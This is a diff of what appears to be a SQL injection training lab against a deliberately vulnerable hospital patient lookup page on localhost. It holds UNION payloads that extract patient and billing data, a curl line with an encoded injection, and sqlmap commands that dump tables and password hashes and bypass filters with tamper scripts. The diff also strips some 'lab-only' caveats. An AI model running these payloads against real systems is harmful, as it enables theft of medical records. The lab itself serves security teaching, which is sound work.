@@ -209,7 +209,7 @@ mysqli_close($conn);
 - Because the application echoes the constructed SQL (debug), students can clearly see how payloads map to the executed query — useful for learning.
 
 
-## 3) Step-by-step exploitation (lab-only)
+## 3) Step-by-step exploitation
 
 > Perform these steps only in the lab environment described in Setup.
 
@@ -217,7 +217,7 @@ mysqli_close($conn);
 
 - Ensure hospital_emr has sample data (patients & billing) inserted.
 - Visit vulnerable page, e.g.:
-http://127.0.0.1:8000/patient_lookup.php?q=John
+http://127.0.0.1:8080/patient_lookup.php?q=John
 You should see only matching rows for John.
 
 
@@ -259,7 +259,7 @@ The query becomes (conceptually):
 **Example payload (search box):**
 
 ```sql
-' UNION SELECT 1, medical_record_number, first_name, last_name, dob, email FROM patients --
+' UNION SELECT 1, medical_record_number, first_name, last_name, dob, email FROM patients -- 
 ```
 
 **Notes:**
@@ -271,7 +271,7 @@ The query becomes (conceptually):
 Extracting billing info (map billing columns into the 6 display columns):
 
 ```sql
-' UNION SELECT id, CONCAT('BILL#',id), amount, currency, status, description FROM billing --
+' UNION SELECT id, CONCAT('BILL#',id), amount, currency, status, description FROM billing -- 
 ```
 
 **Result:** Billing rows appear in the patients table display — demonstrating exfiltration to a UI that wasn't intended to show billing.
@@ -299,15 +299,9 @@ Time-based example (MySQL):
 
 If direct responses are blocked but the database can make network calls (rare in default MySQL), use features (e.g., LOAD_FILE, OUTFILE, or DB-specific UDFs) or cause DNS/HTTP callbacks to an attacker-controlled server. Do not perform network exfiltration on shared lab networks. This is only for advanced/simulated labs.
 
-### Step 6 — Automated testing using sqlmap (preview)
-
-You will cover sqlmap in the next lab section, but as a preview: sqlmap can discover and exploit SQLi automatically. Example test (lab-only):
-
-
-```sql
-sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=John" --data="q=John" --level=2 --risk=1 --batch --dump
+```http request
+curl "http://127.0.0.1:8080/patient_lookup.php?q=%27+UNION+SELECT+1%2C+medical_record_number%2C+first_name%2C+last_name%2C+dob%2C+email+FROM+patients+--+"
 ```
->--dump attempts to extract tables/data; for lab use only. We'll cover sqlmap properly in Part 3.
 
 
 ## Common pitfalls & hints for students
@@ -448,7 +442,7 @@ It starts from installation, moves to discovery, enumeration, targeted extractio
 
 ## Lab assumptions & target
 
-- Vulnerable page (lab): `http://127.0.0.1:8000/patient_lookup.php?q=John`
+- Vulnerable page (lab): `http://127.0.0.1:8080/patient_lookup.php?q=John`
 - Database: `hospital_emr` (schema and sample data already prepared in the **Setup** page)
 - You run commands on the lab host (Linux/macOS/Windows WSL) with `python3` and `pip` available.
 
@@ -477,7 +471,7 @@ cd sqlmap
 Start with a low-risk check to see if q is injectable (no dumping):
 
 ```bash
-sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=John" --batch --level=1 --risk=1 --technique=BE --threads=2
+sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=John" --batch --level=1 --risk=1 --technique=BE --threads=2
 ```
 
 * --level / --risk control intensity (begin low).
@@ -490,7 +484,7 @@ sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=John" --batch --level=1 --
 
 Let sqlmap probe the q parameter explicitly:
 ```bash
-sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=*" --batch --level=2 --risk=1
+sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --batch --level=2 --risk=1
 ```
 * Use q=* to instruct sqlmap to test that parameter.
 
@@ -498,23 +492,23 @@ sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=*" --batch --level=2 --ris
 
 Once injection is confirmed, enumerate DBs and users:
 
-* sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=*" --dbs --batch
-* sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=*" --current-db --batch
-* sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=*" --users --passwords --batch
+* sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --dbs --batch
+* sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --current-db --batch
+* sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --users --passwords --batch
 
 **Goal:** confirm hospital_emr exists and inspect DB users (lab only).
 
 ## 5 — List tables in hospital_emr
 
 ```bash
-sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=*" -D hospital_emr --tables --batch
+sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" -D hospital_emr --tables --batch
 ```
 You should see tables such as patients, billing, appointments, etc.
 
 ## 6 — List columns for a table (example: patients)
 
 ```bash
-sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=*" -D hospital_emr -T patients --columns --batch
+sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" -D hospital_emr -T patients --columns --batch
 ```
 This reveals column names and types (e.g., id, medical_record_number, first_name, last_name, dob, email).
 
@@ -522,24 +516,24 @@ This reveals column names and types (e.g., id, medical_record_number, first_name
 Dump entire table (lab only):
 
 ```bash
-sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=*" -D hospital_emr -T patients --dump --batch
+sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" -D hospital_emr -T patients --dump --batch
 ```
 
 Dump specific columns only (recommended for focused demo):
 
 ```bash
-sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=*" -D hospital_emr -T patients -C "medical_record_number,first_name,last_name,email" --dump --batch
+sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" -D hospital_emr -T patients -C "medical_record_number,first_name,last_name,email" --dump --batch
 ```
 
 Dump rows with a WHERE clause:
 
 ```bash
-sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=*" -D hospital_emr -T patients --where="email LIKE '%@example.test'" --dump --batch
+sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" -D hospital_emr -T patients --where="email LIKE '%@example.test'" --dump --batch
 ```
 
 Dump billing table (exfiltration demo):
 ```bash
-sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=*" -D hospital_emr -T billing --dump --batch
+sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" -D hospital_emr -T billing --dump --batch
 ```
 
 **Notes:**
@@ -552,7 +546,7 @@ sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=*" -D hospital_emr -T bill
 Simulate POST body with --data:
 
 ```bash
-sqlmap -u "http://127.0.0.1:8000/patient_lookup.php" --data="q=John" -p q --batch
+sqlmap -u "http://127.0.0.1:8080/patient_lookup.php" --data="q=John" -p q --batch
 ```
 * -p q tells sqlmap to focus on parameter q.
 * Use --data for POST targets.
@@ -561,23 +555,23 @@ sqlmap -u "http://127.0.0.1:8000/patient_lookup.php" --data="q=John" -p q --batc
 
 * Increase depth for more aggressive tests:
 ```bahs
-sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=*" --level=5 --risk=3 --batch
+sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --level=5 --risk=3 --batch
 ```
 * Use tamper scripts if basic payloads are filtered (only in lab):
 ```bash
-sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=*" --tamper=between,randomcase --batch
+sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --tamper=between,randomcase --batch
 ```
 * Set custom headers / cookies if the app requires authentication:
 ```bash
-sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=*" --headers="User-Agent: sqlmap" --cookie="SESSION=abcd" --batch
+sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --headers="User-Agent: sqlmap" --cookie="SESSION=abcd" --batch
 ```
 * Threads for speed:
 ```bash
-sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=*" --threads=5 --batch
+sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --threads=5 --batch
 ```
 * Specify output directory:
 ```bash
-sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=*" --output-dir=./sqlmap-output --batch
+sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --output-dir=./sqlmap-output --batch
 ```
 
 
@@ -594,13 +588,13 @@ sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=*" --output-dir=./sqlmap-o
 Boolean-based (slower, less noisy):
 
 ```bash
-sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=*" --technique=B --batch
+sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --technique=B --batch
 ```
 
 Time-based:
 
 ```bash
-sqlmap -u "http://127.0.0.1:8000/patient_lookup.php?q=*" --technique=T --sleep=3 --batch
+sqlmap -u "http://127.0.0.1:8080/patient_lookup.php?q=*" --technique=T --sleep=3 --batch
 ```
 
 ## 12 — Safety, etiquette & cleanup
@@ -618,7 +612,7 @@ rm -rf ~/.local/share/sqlmap/output/*
 After you deploy patient_lookup_fixed.php (prepared statements), validate that sqlmap can no longer exploit the parameter:
 
 ```bash
-sqlmap -u "http://127.0.0.1:8000/patient_lookup_fixed.php?q=*" --batch --level=2 --risk=1
+sqlmap -u "http://127.0.0.1:8080/patient_lookup_fixed.php?q=*" --batch --level=2 --risk=1
 ```
 
 **Expected:** sqlmap should not confirm injection; attempts to dump should fail or produce no results.
